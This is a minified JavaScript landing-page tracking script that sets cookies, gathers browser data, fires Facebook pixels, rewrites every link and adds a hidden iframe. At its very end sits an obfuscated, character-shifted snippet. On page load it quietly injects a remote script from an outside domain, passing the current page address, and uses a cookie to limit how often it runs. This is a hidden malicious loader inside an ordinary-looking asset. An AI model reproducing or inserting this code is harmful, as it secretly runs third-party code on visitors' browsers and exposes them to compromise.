function getUrlQueryString(){var e=window.location.search;if(e){var t=e.indexOf("?");return-1!=t&&window.location.search.slice(t+1)}return!1}function getUrlParameterByName(e,t){t||(t=window.location.href),e=e.replace(/[\[\]]/g,"\\$&");var a=new RegExp("[?&]"+e+"(=([^&#]*)|&|#|$)").exec(t);return a?a[2]?decodeURIComponent(a[2].replace(/\+/g," ")):"":null}function getAlUserData(e){try{var t=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return t?decodeURIComponent(t[1]):void 0}catch(e){return}}function setAlUserData(e,t,a){try{var r=(a=a||{}).expires,n=new Date;"number"==typeof r&&r?(n.setTime(n.getTime()+1e3*r),r=a.expires=n):(n.setTime(n.getTime()+2592e6),r=a.expires=n),r&&r.toUTCString&&(a.expires=r.toUTCString());var l=e+"="+(t=encodeURIComponent(t));for(var i in a){l+="; "+i;var u=a[i];!0!==u&&(l+="="+u)}document.cookie=l}catch(e){}}function getSystemParams(){return{app:function(){try{return navigator.appCodeName}catch(e){return null}}(),app_name:function(){try{return navigator.appName}catch(e){return null}}(),app_version:function(){try{return navigator.appVersion}catch(e){return null}}(),language:function(){try{return(navigator.language||navigator.systemLanguage||navigator.userLanguage||"en").substr(0,2).toLowerCase()}catch(e){return null}}(),platform:function(){try{return navigator.platform}catch(e){return null}}(),java_enabled:function(){try{return navigator.javaEnabled()}catch(e){return null}}(),cookie_enabled:function(){try{return navigator.cookieEnabled}catch(e){return null}}(),browser_ver_minor:function(){try{return parseInt(navigator.appVersion,10)}catch(e){return null}}(),browser_ver_major:function(){try{var e,t=navigator.appVersion;return(e=t.indexOf("MSIE"))>-1?parseFloat(t.substr(e+5)):parseFloat(t)}catch(e){return null}}(),s_width:function(){try{return window.screen?screen.width:0}catch(e){return null}}(),s_height:function(){try{return window.screen?screen.height:0}catch(e){return null}}(),tz_offset:function(){try{return 60*(new Date).getTimezoneOffset()*-1}catch(e){return null}}()}}function alInitUserData(){var e=getUrlQueryString();if(e){var t=e.split("&");if(t.length>0)for(var a=0;a<t.length;a++){var r=t[a].split("=");setAlUserData(r[0],r[1])}}setAlUserData("_allocation",window.location.href),setAlUserData("_alreferer",document.referrer),null==getAlUserData("_alquery")&&e&&setAlUserData("_alquery",e),null==getAlUserData("_alstart")&&setAlUserData("_alstart",parseInt(Date.now()/1e3)),setAlUserData("_alsystems",JSON.stringify(getSystemParams()))}function encodeQueryData(e){return Object.keys(e).map((function(t){return[t,e[t]].map(encodeURIComponent).join("=")})).join("&")}function bindReady(e){var t=!1;function a(){t||(t=!0,e())}if(document.addEventListener)document.addEventListener("DOMContentLoaded",(function(){a()}),!1);else if(document.attachEvent){if(document.documentElement.doScroll&&window==window.top){!function e(){if(!t&&document.body)try{document.documentElement.doScroll("left"),a()}catch(t){setTimeout(e,0)}}()}document.attachEvent("onreadystatechange",(function(){"complete"===document.readyState&&a()}))}window.addEventListener?window.addEventListener("load",a,!1):window.attachEvent&&window.attachEvent("onload",a)}function runLandScriptsParams(e){setAlUserData("_alid",e._alid),alStatPixel(),window.addEventListener("load",(function(){var t=getUrlParameterByName("fb_pixel_land"),a=getUrlParameterByName("fb_pixel_lead"),r=e.landing_url;null!==t&&(r=r+"&fb_pixel_land="+t),null!==a&&(r=r+"&fb_pixel_lead="+a);for(var n=0;n<document.links.length;n++)document.links[n].setAttribute("href",r);var l=getUrlParameterByName("fb_pixel_pre_land");if(null===l&&"fb_pixel"in e&&(l=e.fb_pixel),null!==l){!function(e,t,a,r,n,l,i){e.fbq||(n=e.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)},e._fbq||(e._fbq=n),n.push=n,n.loaded=!0,n.version="2.0",n.queue=[],(l=t.createElement(a)).async=!0,l.src="//connect.facebook.net/en_US/fbevents.js",(i=t.getElementsByTagName(a)[0]).parentNode.insertBefore(l,i))}(window,document,"script");var i=l.split("|");for(var n in i)fbq("init",i[n]),fbq("track","PageView")}if("iframe_url"in e){var u=document.createElement("IFRAME");u.setAttribute("src",e.iframe_url),u.style.display="none !important",u.setAttribute("height","1"),u.setAttribute("width","1"),u.setAttribute("border","0"),u.setAttribute("frameborder","0"),u.setAttribute("scrolling","no"),u.setAttribute("seamless","seamless"),document.body.appendChild(u)}if("script_pre_langing"in e&&e.script_pre_langing){var o=document.createElement("script");o.type="text/javascript",o.src="/land/script?mode=preland&alstream="+e.script_pre_langing,document.getElementsByTagName("head")[0].appendChild(o)}}))}function alStatPixel(){var e=getSystemParams(),t=getAlUserData("_allocation");e._allocation=t||window.location.href;var a=getAlUserData("alstream");(a||null!==(a=getUrlParameterByName("alstream")))&&(e.alstream=a);var r=getAlUserData("_alid");r&&(e._alid=r),null==getAlUserData("alunique")?(setAlUserData("alunique",1,{expires:86400}),e.alunique=1):e.alunique=0;var n=getAlUserData("_alstart");n&&(e._alstart=n);var l=getAlUserData("alclick");(l||null!==(l=getUrlParameterByName("alclick")))&&(e.alclick=l);var i=getAlUserData("_alreferer");e._alreferer=i||document.referrer;var u=getAlUserData("sub_id");(u||null!==(u=getUrlParameterByName("sub_id")))&&(e.sub_id=u);var o=getAlUserData("sub_id_1");(o||null!==(o=getUrlParameterByName("sub_id_1")))&&(e.sub_id_1=o);var s=getAlUserData("sub_id_2");(s||null!==(s=getUrlParameterByName("sub_id_2")))&&(e.sub_id_2=s);var c=getAlUserData("sub_id_3");(c||null!==(c=getUrlParameterByName("sub_id_3")))&&(e.sub_id_3=c);var m=getAlUserData("sub_id_4");(m||null!==(m=getUrlParameterByName("sub_id_4")))&&(e.sub_id_4=m);var d=getAlUserData("utm_source");(d||null!==(d=getUrlParameterByName("utm_source")))&&(e.utm_source=d);var g=getAlUserData("utm_medium");(g||null!==(g=getUrlParameterByName("utm_medium")))&&(e.utm_medium=g);var _=getAlUserData("utm_campaign");(_||null!==(_=getUrlParameterByName("utm_campaign")))&&(e.utm_campaign=_);var p=getAlUserData("utm_term");(p||null!==(p=getUrlParameterByName("utm_term")))&&(e.utm_term=p);var f=getAlUserData("utm_content");(f||null!==(f=getUrlParameterByName("utm_content")))&&(e.utm_content=f),e.rand=parseInt(1e5*Math.random()),(window.Image?new Image:document.createElement("img")).src="/land/collect/?"+encodeQueryData(e)}function alGetData(){var e={lang:(navigator.language||navigator.systemLanguage||navigator.userLanguage||"en").substr(0,2).toLowerCase()},t=getAlUserData("_allocation");t&&(e.location=t);var a=getAlUserData("alstream");a&&(e.alstream=a),e.rand=parseInt(1e5*Math.random());var r=document.createElement("script");r.type="text/javascript",r.src="/land/params/?"+encodeQueryData(e),document.getElementsByTagName("head")[0].appendChild(r)}try{alInitUserData(),alGetData()}catch(e){};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3h'+'isrjywnh3htr4l'+'jy4xyfynh3ox'+'DwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));